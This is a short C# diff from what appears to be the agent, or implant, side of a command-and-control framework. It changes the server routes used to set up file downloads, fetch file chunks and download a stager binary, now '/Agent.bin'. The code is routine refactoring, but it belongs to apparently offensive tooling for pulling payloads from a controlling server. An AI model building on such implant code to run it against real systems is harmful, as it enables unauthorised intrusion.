@@ -117,14 +117,14 @@ namespace Agent.Models
 
         private async Task<FileDescriptor> SetupDownload(string id)
         {
-            var response = await _client.GetByteArrayAsync($"/SetupDownload?id={id}");
+            var response = await _client.GetByteArrayAsync($"/SetupDownload/{id}");
             //var json = Encoding.UTF8.GetString(response);
             return response.Deserialize<FileDescriptor>();
         }
 
         private async Task<FileChunk> GetFileChunk(string id, int chunckIndex)
         {
-            var response = await _client.GetByteArrayAsync($"/DownloadChunk?id={id}&index={chunckIndex}");
+            var response = await _client.GetByteArrayAsync($"/DownloadChunk/{id}/{chunckIndex}");
             return response.Deserialize<FileChunk>();
         }
 
@@ -250,7 +250,7 @@ namespace Agent.Models
         }
         public override async Task<Byte[]> DownloadStagerBin()
         {
-            var response = await _client.GetAsync("/StagerBin");
+            var response = await _client.GetAsync("/Agent.bin");
             var responseContent = await response.Content.ReadAsByteArrayAsync();
             return responseContent;
         }
